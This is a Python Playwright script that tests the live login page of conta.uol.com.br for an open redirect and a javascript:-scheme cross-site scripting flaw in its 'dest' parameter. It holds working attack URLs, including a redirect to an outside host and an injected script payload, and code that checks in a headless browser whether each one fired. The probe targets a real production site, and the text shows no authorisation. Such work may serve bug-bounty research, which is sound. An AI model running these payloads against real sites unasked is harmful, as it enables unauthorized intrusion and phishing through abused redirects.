#!/usr/bin/env python3
"""Empirically test conta.uol.com.br SSO `dest` param: open-redirect + javascript: XSS.
Unauthenticated behavior observation (visitor flow)."""
import time
from playwright.sync_api import sync_playwright

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
tests=[
 ("open_redirect_ext","https://conta.uol.com.br/login?t=uol_webmail&env=visitante&dest=https://example.com/UOLPOC"),
 ("open_redirect_evil","https://conta.uol.com.br/login?dest=https://example.com/UOLPOC"),
 ("js_scheme_xss","https://conta.uol.com.br/login?t=uol_webmail&env=visitante&dest=javascript:window.__XSS__=document.domain"),
]
with sync_playwright() as p:
    b=p.chromium.launch(channel="chrome",headless=True,
        args=["--no-sandbox","--disable-dev-shm-usage","--lang=pt-BR"])
    for name,url in tests:
        ctx=b.new_context(locale="pt-BR",user_agent=UA)
        pg=ctx.new_page()
        fired={"dialog":False,"xss":None,"console":[]}
        pg.on("dialog",lambda d:(fired.__setitem__("dialog",True),d.dismiss()))
        pg.on("console",lambda m:fired["console"].append(m.text[:60]))
        try:
            pg.goto(url,wait_until="networkidle",timeout=35000)
            time.sleep(3)
            final=pg.url
            # check XSS global
            try: fired["xss"]=pg.evaluate("window.__XSS__||null")
            except: pass
            ext = "example.com" in final
            print(f"[{name}]")
            print(f"   final_url = {final[:90]}")
            print(f"   OPEN_REDIRECT_to_example = {ext}")
            print(f"   JS_XSS_fired = {fired['xss']!r}  dialog={fired['dialog']}")
        except Exception as e:
            print(f"[{name}] ERR {repr(e)[:80]} cur={pg.url[:70]}")
        ctx.close()
    b.close()
